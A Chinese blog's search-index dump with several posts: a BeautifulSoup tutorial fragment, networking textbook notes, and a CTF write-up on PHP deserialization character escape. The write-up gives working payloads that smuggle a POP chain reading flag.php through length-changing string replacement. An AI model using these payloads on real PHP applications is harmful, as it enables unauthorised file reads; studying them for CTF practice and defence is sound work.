&quot;&quot;&quot; &lt;ul&gt; &lt;li&gt; &lt;a href=&quot;http://www.baidu.com/&quot;&gt;百度一下&lt;/a&gt; &lt;/li&gt; &lt;li&gt;合适的话发多少&lt;/li&gt; &lt;li&gt; &lt;a class=&quot;baidu&quot; href=&quot;http://www.baidu.com/&quot;&gt;不会发生看到&lt;/a&gt; &lt;/li&gt; &lt;li&gt; &lt;a id=&quot;lagou&quot; href=&quot;http://www.lagou.com/&quot;&gt;lagou&lt;/a&gt; &lt;/li&gt; &lt;li&gt; &lt;label class=&quot;enterText enterArea&quot;&gt;列表图预览：&lt;/label&gt; &lt;p class=&quot;enterImg&quot;&gt; &lt;img id=&quot;previewImage&quot; title=&apos;mmm&apos; src=&quot;http://www.google.com/logo.png&quot;/&gt; &lt;/p&gt; &lt;div class=&quot;Validform_checktip&quot;&gt;范德萨范德萨&lt;/div&gt; &lt;/li&gt; &lt;/ul&gt;&quot;&quot;&quot;soup = BeautifulSoup(html_str,&apos;html.parser&apos;)#html对象 text文本去掉标签# print(soup)# print(soup.text)# &lt;class &apos;bs4.BeautifulSoup&apos;&gt; 对象类型# print(type(soup))# 查找a标签 .text打印a的内容# print(soup.find(&apos;a&apos;))# print(soup.find(&apos;a&apos;).text)# 查找a标签 class=baidu的# print(soup.find(&apos;a&apos;,class_=&apos;baidu&apos;))# 查找id=lagou# print(soup.find(id=&apos;lagou&apos;))# 查找title=&apos;mmm&apos; 前边可以写具体找哪个标签# print(soup.find(title=&apos;mmm&apos;))# find_all 找所有 返回一个list 数组类型# print(soup.find_all(&apos;a&apos;))# print(soup.find_all(&apos;a&apos;)[0]) #第一个all_a = soup.find_all(&apos;a&apos;)for item in all_a: if item: # print(item.attrs) print(item.attrs[&apos;href&apos;]) #dict类型","link":"2019/03/21/%E7%B2%BE%E9%80%9APython%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB-%E4%B8%89%E5%9B%9B%E7%AB%A0%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8/"},{"title":"聊一聊PHP反序列化中的字符逃逸","text":"楔子 再来水文 正文 2020安恒4月月赛的一道反序列化字符串逃逸 题目分析 逃逸姿势 payload-利用read()函数-后一项添加数据 如果只用了write()函数-在前一项添加数据 总结 楔子故事发生在一个旅游景点，一个旅游团来到一个旅游景点，旅游景点的检票规则是，由领头前去客服大厅买票，比如买了10张，于是他带领他的旅游团来到检票口，每个人手上拿着自己的票。并且大人小孩均必须都要买是全票 假设有这么一个问题，在售票处如果不区分大人小孩的票，而是统一的单人票。 再说说有问题的检票口的规则是 由于票检处的工作人员自作主张，认为小孩手上只要拿半票就能通过。那么检票口的工作人员有2个规则 1、当通过的人等于当天售卖的所有票数，检票关闭，不允许人员通过2、大人通过手上必须持有全张票，小孩通过手上持有半张票 那么我们考虑这样一个场景，我们假设大人为符号Y,小孩为符号X,我们旅游团有2个小孩，2个大人。他们一共买了4张全票，假设大人手上的票是Y，小孩手上的票也是X，注意此时小孩手上的也是全票,小孩如果把整票撕一半的半张票假设为x。他们的现在的票情况是YYYY，而这个旅游景点的生意并不好，一共卖了2组票，另外一组是一对兄弟他们也是全票YY,他们由于做多人运动比较晚到 所以对于旅游区来说原定的票通过次序是这样检票口| YYXXYY 但是由于检票处的自作主张，对于检票人员相当于做了一层替换str_replace(&apos;X&apos;,&apos;xx&apos;,&apos;YYXXYY&apos;) 成为了YYxxxxYY,那么我们的旅游团发现这个问题后，可以让2个无关的小孩持多出的半张票通过，那么后面匆匆赶来的那对兄弟因为检票口规则1而拒之门外 栗子好牵强，哈哈哈哈 再来水文先回顾一下我们的php序列化与发序列化一个最正常的demo &lt;?phpclass People{ var $name; function People($name){ $this-&gt;name=$name; }}$me=new People(&apos;st4ck&apos;); echo serialize($me);?&gt; 输出O:6:&quot;People&quot;:1:{s:4:&quot;name&quot;;s:5:&quot;st4ck&quot;;}而反序列化php有2个特性 1.PHP 在反序列化时，底层代码是以 ; 作为字段的分隔，以 } 作为结尾(字符串除外)，并且是根据长度判断内容的2.对类中不存在的属性也会进行反序列化 比如我们发现 &lt;?phpclass People{ var $name;}$me=&apos;O:6:&quot;People&quot;:2:{s:4:&quot;name&quot;;s:5:&quot;st4ck&quot;;s:3:&quot;age&quot;;s:2:&quot;20&quot;;}pppppppppppppppppppppppppppad&apos;; var_dump(unserialize($me)) ;?&gt; 输出 object(People)#1 (2) { [&quot;name&quot;]=&gt; string(5) &quot;st4ck&quot; [&quot;age&quot;]=&gt; string(2) &quot;20&quot;} 另外我们的反序列化字符串中的s非常严格比如O:6:&quot;People&quot;:1:{s:4:&quot;name&quot;;s:5:&quot;st4ck&quot;;}如果改动一个字符长度为O:6:&quot;People&quot;:1:{s:4:&quot;name&quot;;s:4:&quot;st4ck&quot;;}或者O:6:&quot;People&quot;:1:{s:4:&quot;name&quot;;s:6:&quot;st4ck&quot;;}就会报错，因为反序列化的时候会严格通过s的值往后找字符串，这里并不是检测s:6:后面双引号闭合的长度判断是否出错，比如我们O:6:&quot;People&quot;:1:{s:4:&quot;name&quot;;s:6:&quot;st4ck&quot;&quot;;}所以并不是通过双引号来判断长度，而是以长度为标准，无论是什么符号丢进去，再观察结构是否出错 正文不过好像我们还没说到php反序列化的字符逃逸，现在来说一说这个逃逸问题 这个漏洞主要是发生在序列化后的时候，如果做了字符串长度的变化，那么就会引起逃逸问题我们来为上面的旅游团建立一个模型，如果不存在检票口的失误，那么就是 &lt;?php$team1 = &quot;YYXX&quot;;$team2 = &quot;YY&quot;;$travel = array($team1, $team2);echo(serialize($travel));$r =serialize($travel);echo &quot;\\n&quot;;var_dump(unserialize($r)); 输出，我们假设数组的2个值分别为第一批进入和第二批进入的人 a:2:{i:0;s:4:&quot;YYXX&quot;;i:1;s:2:&quot;YY&quot;;}array(2) { [0]=&gt; string(4) &quot;YYXX&quot; [1]=&gt; string(2) &quot;YY&quot;} 假设我们加了一层小孩的全票变成2张小孩票 function filter($string){ $a = str_replace(&apos;X&apos;,&apos;xx&apos;,$string); return $a;} 那么其实只要有小孩就一定会让旅游团的票据出现错误（即通过的人和总售票价不同），前面的例子我们通过多通过了2个人，现在因为我们要做反序列化，前面说到我们因为反序列化的特性，我们如果要替换第二组人员我们需要的不只2个位，这个其实和xss或者sql注入差不多，需要做闭合操作比如前面的正常的下面这个，我们要闭合并且让第二批进入的为ee，那么我们第一批要什么数据？其实如果从sql注入的角度就是下面的我们可以控制，要如何输入的问题 a:2:{i:0;s:4:&quot;{{input}}&quot;;i:1;s:2:&quot;YY&quot;;} 首先前面有个s:4,所以4个字符长度一定的，那么还需要多少后面还需要多少？Input=XXXX&quot;;i:1;s:2:&quot;EE&quot;;}其实就是len(&quot;;i:1;s:2:&quot;EE&quot;;})=16,也就是说我们要在正常input后面多出16符号来自定义伪造出EE,其实就是多出16个小孩的票能让我们的伪造小孩&quot;;i:1;s:2:&quot;EE&quot;;}进入,进一步覆盖了第二批的正常人，于是我们可以安装我们的想法进行测试 &lt;?phpfunction filter($string){ $a = str_replace(&apos;X&apos;,&apos;xx&apos;,$string); return $a;}$team1 = &apos;YYXXXXXXXXXXXXXXXX&quot;;i:1;s:2:&quot;EE&quot;;}&apos;; //16个X$team2 = &quot;YY&quot;;$travel = array($team1, $team2);echo(serialize($travel));echo &quot;\\n&quot;;$r = filter(serialize($travel));echo($r);echo &quot;\\n&quot;;var_dump(unserialize($r)); 输出 a:2:{i:0;s:34:&quot;YYXXXXXXXXXXXXXXXX&quot;;i:1;s:2:&quot;EE&quot;;}&quot;;i:1;s:2:&quot;YY&quot;;}a:2:{i:0;s:34:&quot;YYxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:2:&quot;EE&quot;;}&quot;;i:1;s:2:&quot;YY&quot;;}array(2) { [0]=&gt; string(34) &quot;YYxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot; [1]=&gt; string(2) &quot;EE&quot;} 我们确实做到了 2020安恒4月月赛的一道反序列化字符串逃逸题目分析给了源码 &lt;?phpshow_source(&quot;index.php&quot;);function write($data) { return str_replace(chr(0) . &apos;*&apos; . chr(0), &apos;\\0\\0\\0&apos;, $data);}function read($data) { return str_replace(&apos;\\0\\0\\0&apos;, chr(0) . &apos;*&apos; . chr(0), $data);}class A{ public $username; public $password; function __construct($a, $b){ $this-&gt;username = $a; $this-&gt;password = $b; }}class B{ public $b = &apos;gqy&apos;; function __destruct(){ $c = &apos;a&apos;.$this-&gt;b; echo $c; }}class C{ public $c; function __toString(){ //flag.php echo file_get_contents($this-&gt;c); return &apos;nice&apos;; }}$a = new A($_GET[&apos;a&apos;],$_GET[&apos;b&apos;]);//省略了存储序列化数据的过程,下面是取出来并反序列化的操作$b = unserialize(read(write(serialize($a)))); 首先class B和C是一个简单的pop链，很容易构造出 class B{ function __construct() { $this-&gt; b = new C(); }}class C{ function __construct() { $this-&gt; c = &quot;flag.php&quot;; }}$b=new B();echo serialize($b); 我们只要想办法将输出O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}进行反序列化即可前面我们还说过php的2个特性 1.PHP 在反序列化时，底层代码是以 ; 作为字段的分隔，以 } 作为结尾(字符串除外)，并且是根据长度判断内容的2.对类中不存在的属性也会进行反序列化 居然类中不存在属性也会被反序列化我们这样测试echo serialize(new A(&quot;st4ck&quot;, &quot;123qwe&quot;));发现输出了O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;st4ck&quot;;s:8:&quot;password&quot;;s:6:&quot;123qwe&quot;;}我们需要把O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}并入上面的代码即O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;st4ck&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}}从代码的角度看就是 $b=new B();$user=new User(&quot;st4ck&quot;,$b); 那我们就写出来了对不对但是这个反序列化的字符串并不是我们输入的，而是通过get传入 $a = new A($_GET[&apos;a&apos;],$_GET[&apos;b&apos;]);$b = unserialize(read(write(serialize($a)))); 如此一来，我们就不能通过这样的方法了 逃逸姿势字符逃逸的精髓 如果长度变长，那么我们就是在前面一项添加数据，如果长度变小，那么我们在后面一项添加数据 这里如果给了read()和write()2个函数的话，那么肯定也会有两种payload，但是因为这里的是$b = unserialize(read(write(serialize($a))));如果利用了write会直接被read还原，但是理论上如果只用write函数即$b = unserialize(write(serialize($a)));,我们就可以在username上添加shellcode实现。而使用两个嵌套我们必须使用外层的方法，也正是因为里面的未调用，只调用了外面的导致长度变化 payload-利用read()函数-后一项添加数据我们假设先利用read()函数，我们发现read函数将6个字符变成了3个字符str_replace(&apos;\\0\\0\\0&apos;, chr(0) . &apos;*&apos; . chr(0), $data);,那么如此我们就是要将需要反序列化的数据丢第二项后面，当第一项长度减小时候，相当于吞并了第二项，导致我们需要反序列化的数据成功反序列化， 如果要吞并即使将S1=O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;st4ck&quot;;s:8:&quot;password&quot;;s:6:&quot;123qwe&quot;;}后面多加一个属性那么我们要吞并S2=&quot;;s:8:&quot;password&quot;;s:6:&quot;然后shellcode后面要有完整的数据S3=&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}将变成我们要做的是 S1-S2123qwe替换成S3 即O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:5:&quot;st4ck&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}&quot;;}那么理论上是ok的了现在涉及到我们发现要吞并的S2(&quot;;s:8:&quot;password&quot;;s:6:&quot;)长度为22，但是我们真实环境不是这样的 问题1、我们的s1是通过serialize(new A(&quot;st4ck&quot;, &quot;123qwe&quot;));完成，如果我们添加了很多shellcode在password里面，那么S1中password的长度就不是个位数，比如是20那么S2=&quot;;s:8:&quot;password&quot;;s:20:&quot;,这样就是S2长度就是22+1问题2、我们通过read函数来减少用户名，read函数没经过一次是减小3个字节，那么我们一定要是3个倍数，我们可以去3*8=24，经过8次往前缩进了24个字符，我们可以在S3前面增加一个A,因为S3前面的的数据最后是合并在用户名里的，刚好做补充,8次即24个\\0,注意转码那么我们可以构造通过read()函数写payload &lt;?phpclass B{ public $b = &apos;gqy&apos;; function __destruct(){ $c = &apos;a&apos;.$this-&gt;b; echo $c; }}class C{ public $c; function __toString(){ return $this-&gt;c; }}class A{ public $username; public $password; public function __construct($username, $password){ $this-&gt;username = $username; $this-&gt;password = $password; }}function write($data) { return str_replace(chr(0) . &apos;*&apos; . chr(0), &apos;\\0\\0\\0&apos;, $data);}function read($data) { return str_replace(&apos;\\0\\0\\0&apos;, chr(0) . &apos;*&apos; . chr(0), $data);}$username = &quot;\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0\\\\0&quot;;//24个\\\\0$password = &quot;A&quot;;$payload = &apos;&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}&apos;; $shellcode=$password.$payload;echo serialize(new A($username, $shellcode));echo &quot;\\n&quot;;echo read(write(serialize(new A($username, $shellcode))));echo &quot;\\n&quot;;unserialize(read(write(serialize(new A($username, $shellcode))))); 输出 O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:48:&quot;\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&quot;;s:8:&quot;password&quot;;s:73:&quot;A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}&quot;;}O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:48:&quot; * * * * * * * * &quot;;s:8:&quot;password&quot;;s:73:&quot;A&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}&quot;;}aflag.php 因为\\0是不可见，下面的**中间可能有的环境下看起来没有东西，这里为了方便改写了输出flag，但是payload是一样的其实看输出我们就能发现username吸收了一部分payload导致我们成功注入的内涵 如果只用了write()函数-在前一项添加数据偏移我动态调整了（真鸡儿和栈溢出算位移差不多） 只用write的意思是反序列化的时候unserialize(write(serialize(new A($shellcode, $password))));其实难度就是来计算一下偏移了，计算方法，我们的shellcode$payload = &apos;&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}&apos; 长度为72，那么我们要24组chr(0) . &apos;*&apos; . chr(0)即24组\\0*\\0\\0*\\0\\0*\\0,因为我们是覆盖username,那么password可以随意填payload &lt;?phpclass B{ public $b = &apos;gqy&apos;; function __destruct(){ $c = &apos;a&apos;.$this-&gt;b; echo $c; }}class C{ public $c; function __toString(){ return $this-&gt;c; }}class A{ public $username; public $password; public function __construct($username, $password){ $this-&gt;username = $username; $this-&gt;password = $password; }}function write($data) { return str_replace(chr(0) . &apos;*&apos; . chr(0), &apos;\\0\\0\\0&apos;, $data);}$username = &quot;\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0\\0*\\0&quot;;//24组\\0*\\0\\0*\\0\\0*\\0$password = &quot;A&quot;;$payload = &apos;&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}&apos;; $shellcode=$username.$payload;echo serialize(new A($shellcode, $password));echo &quot;\\n&quot;;echo write(serialize(new A($shellcode, $password)));echo &quot;\\n&quot;;unserialize(write(serialize(new A($shellcode, $password)))); 输出 O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:144:&quot;************************&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}&quot;;s:8:&quot;password&quot;;s:6:&quot;123123&quot;;}O:1:&quot;A&quot;:2:{s:8:&quot;username&quot;;s:144:&quot;\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:{s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:{s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;}}&quot;;s:8:&quot;password&quot;;s:6:&quot;123123&quot;;}aflag.php 总结感觉安全的各种知识都是相通的，xss,sql注入，栈溢出，pwn找gadget都有差不多的内涵学习，学的是学习能力","link":"2020/04/26/%E8%81%8A%E4%B8%80%E8%81%8APHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/"},{"title":"计算机网络自顶向下-Web网页请求过程","text":"一、场景（假设这位同学不是在天朝，能直接访问谷歌 学生将PC用电缆连接到学校以太网交换机，访问 www.google.com 。 comcast为ISP。comcast.net为学校提供DNS服务，服务器在comcast网络中。 DHCP服务器运行在路由器中。 1、通过DHCP获得本机IP等信息 协议：DHCPPC连接到网络时的动作 PC生成DHCP请求报文，放入目的端口67和源端口68的UDP报文段。报文段放入广播目的IP地址（255.255.255.255）和源IP地址（0.0.0.0）的IP数据报中。 该数据报放入以太网帧中，目的MAC地址为广播地址48个1，源MAC地址为PC适配器MAC地址。该帧在交换机所有出口端广播。 路由器接口接收到该帧，抽取出IP数据报。广播IP地址表示该IP数据报需要节点的高层协议处理，所以分解出UDP报文上传UDP。DHCP服务器从UDP报文段中得到该请求报文。 服务器生成DHCP ACK报文，包括分配给PC的IP地址、DNS服务器IP地址、默认网关路由器IP地址（68.85.2.1）、子网块（68.80.2.0、24）。该报文放入UDP、IP数据报、以太网帧中，目的MAC地址为PC的MAC地址、源MAC地址为路由器刚刚收到帧的子网接口的MAC地址。 ACK报文发送到交换机。由于交换机通过自学习，之前从PC接收帧的时候得到MAC地址和端口的映射，所以直接将帧从连接PC的接口转发。 PC接收到帧，一步步抽取出ACK报文，记录下自己的IP地址、DNS服务器地址。配置IP转发表的默认网关，将目的地址为子网块之外的所有数据报发送向默认网关。 DCHP中的4步只有最后两步必须。 2、通过DNS获得谷歌的IP地址 协议：ARP，DNS PC生成DNS查询报文， www.google.com 放入报文的问题段。DNS报文放入端口号53的UDP报文段中，UDP报文段目的IP为DNS服务器的IP地址，源IP地址为PC的IP地址的IP数据报，但是缺少默认网关的目的MAC地址（只知道IP地址）。 PC发送查询默认网关MAC地址的ARP查询报文，放入广播目的地址的以太网帧。向交换机发送该帧，交换机将该帧转发给所有出口端。网关路由器收到查询报文后，准备ARP回答，包括默认网关IP和对应的MAC地址。将ARP回答放入以太网帧，目的MAC地址为PC的MAC地址。发送该帧，通过交换机交付给PC。 PC获取该帧，抽取得到网关路由器的MAC地址。将1中的数据报放入以太网帧，目的MAC地址为网关路由器的MAC地址。将帧发送给交换机，交付给网关路由器。 网关路由器接收帧，抽取IP数据报。根据目的地址和转发表，决定下一跳路由器。将IP数据报放入链路层帧，发送至下一跳路由–comcast最左边路由器。 comcast最左边路由器接收到帧，抽取IP数据报，根据目的IP地址和转发表确定出口，向DNS服务器转发数据报。转发表已经根据域内路由协议和域间路由协议填好。 DNS服务器收到IP数据报，抽取出DNS查询报文，找到对应的IP地址，生成DNS回答报文，放入UDP报文段，反向寻址到学校路由器，最后通过交换机到PC。 PC从DNS报文中抽取出 www.google.com 对应的IP地址。 3、进行客户服务器交互 协议：TCP,HTTP PC生成一个目的端口号80的TCP SYN报文段，放入目的IP为谷歌的IP地址的数据报中。 该数据报通过学校网络、comcast网络、谷歌网络到达谷歌服务器，服务器分配资源，产生TCP SYNACK报文段，放入数据报，反向到达PC。PC形成套接字，进入连接状态，第三次握手与之后的HTTP请求一起发送。 PC的浏览器生成获取URL的HTTP GET报文，写入套接字。生成的TCP报文段放入一个IP数据报中，到达谷歌服务器。 谷歌HTTP服务器从TCP套接字读取HTTP GET报文，生成HTTP响应报文，将请求的页面内容放入HTTP报文实体，将响应报文放入套接字，生成的TCP报文段放入IP数据报，经过网络到达PC。 PC的浏览器从套接字读取HTTP响应，从实体中抽取页面的html，显示web页面。","link":"2019/03/15/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B-Web%E7%BD%91%E9%A1%B5%E8%AF%B7%E6%B1%82%E8%BF%87%E7%A8%8B/"},{"title":"计算机网络自顶向下-多媒体网络","text":"一、多媒体网络应用1.1视频的性质 高比特率:视频最主要的特点就是极大地数据量,由此产生的高比特率的传输 可压缩:为了稍微减少传输的数据量,由此产生了压缩技术,比如会对空白区域进行处理或者由于视频一般具有较多的重复,由此来压缩视频 多版本:在服务器上放置不同版本不同质量的文件. 1.2音频的性质 音频一般是由专用的采样工具先采集样本,在转化为固定数量的量化值进行传输,接收方再解码,这样的技术被称为脉冲编码调制. 同视频一样,音频也可以进行压缩,MP3就是比较常用的一种技术. 1.3多媒体应用的分类多媒体应用主要可以分为以下几类: 流式存储视频/音频:流是一种在选定播放时间点后可以直接播放而不用储存所有的数据再进行播放的一种技术.所以流式视频/音频可以进行暂停,重新定位等操作.而为了使视频/音频连续的播放,接收方必须不停接收数据,否则就会暂停播放.比如优酷,bilibili提供的一些非直播的视频. 会话式视频/音频:不同于流式存储视频/音频,这种方式是即时播放的.所以对时延的敏感性很高,有允许一些丢包,一般来说可以忍受.比如电话语音 流式实况视频/音频:应用的技术同流式存储视频/音频是一样的,只不过更加的注重实时播放,类似于电视直播那样,比如直播. 二.流式存储视频流式存储视频同音频的区别不大,主要是比特率大小的区别,介绍流式存储技术就用视频来介绍.每个视频都被放置在服务器上,并具有特定的URL地址.客户端一般都通过URL来请求特定的视频.而流式存储视频又分为三种:UDP流,HTTP流,适应性DASH流,三者具有相同的特性,他们都会在客户端拥有缓存以对抗延迟和丢包,当然也具有一些不同的特点.以下做简要的描述 2.1、UDP流UDP流即使用UDP协议来传输视频数据,它具有的特点就是实时性,不像HTTP协议会被拥塞控制功能所控制速度.可以以最大的速度传输.也因为此,UDP流容易受到带宽变化所带来的影响.此外,使用UDP流需要额外的控制连接来控制视频的暂停,重定位等功能.由此也会给服务器带来额外的巨大消耗.最后,大量的UDP传输可能会被防火墙干掉. 2.2、HTTP流HTTP流则不同于UDP流,主要使用HTTP协议.第一个特点即使拥有视频预取机制,即比如当前播放的视频需要1k的带宽,但是服务器传输时却回传输更大的带宽(如果线路允许的话),以此在客户端更多的缓存数据,以此对抗网速的变化或者拥塞控制等因素. HTTP流也不仅拥有客户端的应用缓存,还拥有接收缓存,和发送缓存,发送缓存在服务器中.以下是概念图:黑色的代表已使用的缓存空间.当应用缓存存储满时,他会立即通知接收缓存,接着通知发送缓存,此时服务器变不会再发送数据了,相反,如果应用缓存缓存的数据别使用完了,即当前已经没有可以播放的缓存是,就会陷入暂停,直到接收到一定数量的缓存后,才可以继续播放.HTTP流也具有重定位的功能,这是通过对视频文件指定固定地址的字节来实现的. 2.3、适应性DASH流因为各个用户的带宽大小不同,所以会在服务器上放置多种不同质量的视频文件,和一个告示文件,告示文件为每个视频映射一个URL地址,即可让用户得到不同质量的视频, 2.4、内容分发网CDN以上即使流式存数视频技术的不同类型,但是,视频都会被放置在服务器上,内容分发网即使管理这些视频的网络.一般的,这些服务器都是几个及其巨大的服务器集群.他们会邀请ISP接入以使用户获取希望获取的数据.那么CDN是如何管理如此大量的视频的呢?CDN会借用DNS来截获和重定向请求.以下是步骤图: 首先,用户进入视频网站,比如优酷等等,接着发送报文指定希望获取的视频,DNS服务器则会请求权威DNS服务器以获取储存视频的服务器,接着便请求此服务器以获得视频地址,最后,从指定服务器获取希望取得的视频. 三、IP语音3.1 IP语音遇到问题    前文已经讲过,由于会话式使用UDP(基本上使用UDP,有个例)来传输数据,所以会遇到丢包的问题,以及长时间的端到端时延,所以,如果在规定是时间内没有接受到包,此包就会被永远丢弃,而不再使用.     IP语音还会遇到时延抖动的问题,即即使里在服务器,两个包是连续发送的,但是在接收方,他们可能是不连续到达的(路径不同,排队等因素),如果不做处理,就会播放出难以理解的内容.在接收方和发送方都可以进行一定的处理 接收方:可以固定播放时延,即在固定的时间后播放此数据.发送的包中添加发送时的时间戳,接收方接收后,如果此时已在固定播放的时延之后,此包就会被丢弃,不在播放, 发送方:我们可以在发送前对包进行前向纠错EFC,比如把同一数据放入连个连续的包中,这样,即使丢了一个包,也可以通过另一包来恢复数据,或者在发送高质量数据的同时,在发送一段低质量的数据,当高质量包丢失或时延过高是,使用低质量的数据.也可以使用交织技术,主要原理是打乱包中数据的排序,这样,丢失了某个包后,因为是间歇性的丢失,因此对使用的影响较小 3.2、RTP协议即VoIP所使用的协议,一般运行在UDP协议之上.主要功能就是进行会话式语音/视频的传输.下图是报文结构:                有效载荷类型:编码类型,比如音频可能就是PCM. 序号:用于检测丢包和恢复分组 时间戳:用于消除时延抖动 同步源标识符SSRC;表示了RTP流的源,一般来说,RTP会话中的每个流都有不同的SSRC值 3.3、会话发起协议SIP主要功能是提供在呼叫者和被呼叫者经IP网络之间建立连接的功能.,连接的建立类似于三次握手,如下图: SIP报文如下: 类似于SMTP协议,也有from和to首部行,Call-ID唯一标志此呼叫,也有描述类型和大小的首部行. SIP地址不仅仅可以是如上图中的bob@xx.xx.xx.xx,也可以邮箱地址或者手机号,这可以通过使用特殊的设备实现.因为通过SIP地址来建立连接,而IP地址有可能是动态变化的,所以就需要使用到SIP代理和SIP注册器. 每个SIP用户都用相关联的SIP注册器,每当用户切换到新设别时,就会想SIP注册器注册新的IP地址.下图就是其作用机制: 呼叫者发送报文该SIP代理,指明希望呼叫的对象,SIP带了则向SIP注册器发送报文,说明希望获取的被呼叫者的SIP地址所对应的IP地址,如果此SIP注册器没有,就会返回报文,说那个SIP注册器拥有此映射,接着,SIP代理访问另一个SIP注册器,另一个SIP注册器接收到报文后,通知被呼叫的客户,别呼叫者通过以上链路返回一个报文,此时呼叫者和被呼叫者之就建立起了一次呼叫了. 本章思维导图","link":"2019/03/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E8%87%AA%E9%A1%B6%E5%90%91%E4%B8%8B-%E5%A4%9A%E5%AA%92%E4%BD%93%E7%BD%91%E7%BB%9C/"},{"title":"计算机网络自顶向下-无线网络和移动网络","text":"一、概述：这篇文章主要是讨论无线网络和移动网络即我们一般所说的WiFi和手机网络.主要分为4个部分第一部分引言主要大致的描述一下无线网络和移动网络的特点以及和有限网络的区别第二部分讨论WiFi第三部分讨论蜂窝网络.由于有线网络和和无线网络的最大区别在于无线网络可以移动而且需要保持网络的连接第四部分会讨论无线网络的移动管理. 名词简介： 无线主机（wireless host）。端系统。 无线链路（wireless communication link）。主机连接基站或另一台主机。 基站（base station）。主机和基站关联：主机位于基站的无线通信覆盖范围，且主机使用基站中继和更大的网络的数据。例如，蜂窝网中的 蜂窝塔（cell tower），Wifi中的接入点（access point）。 网络基础设施。与主机通信的更大的网络。 与基站关联的主机以基础设施模式（infrastructure mode）运行，传统网络服务（地址分配、路由选择）通过基站提供给主机。自组织网络（ad hoc network）中，主机不与基站相连，主机本身提供这些服务。无线网络类型。标准：无线网分组跨越的无线跳、是否有基础设施。  单跳、基于基础设施。802.11、3G蜂窝网等。 单跳、无基础设施。蓝牙、自组织模式的802.11 多跳、基于基础设施。结点通过无线结点中继通信，连接到基站，如无线网状网络。 多跳、无基础设施。移动自组织网络，包括车载自组织网络。 二、无线链路和网络特征2.1、与有限链路的区别无线链路和有限链路最主要的区别如下: 递减的信号强度:随着阻碍物和距离的增加,信号的强度会有相当大的损失 来自其他源的干扰:无线信号会被其他源的无线信号干扰到,比如电磁炉 多径传播:同一个信号可能会经过多种物质的反射从而在不同时间点传播的同一接收点中. 2.2、会产生的问题由于信号的减弱和障碍物的作用,所以无线链路通信会产生一些有线链路所没有的问题 信噪比SNR:即信号和噪音的比值,用于衡量信号的优劣,值越高代表信号越好,相反,若太低,则表明噪声太多,信号质量差 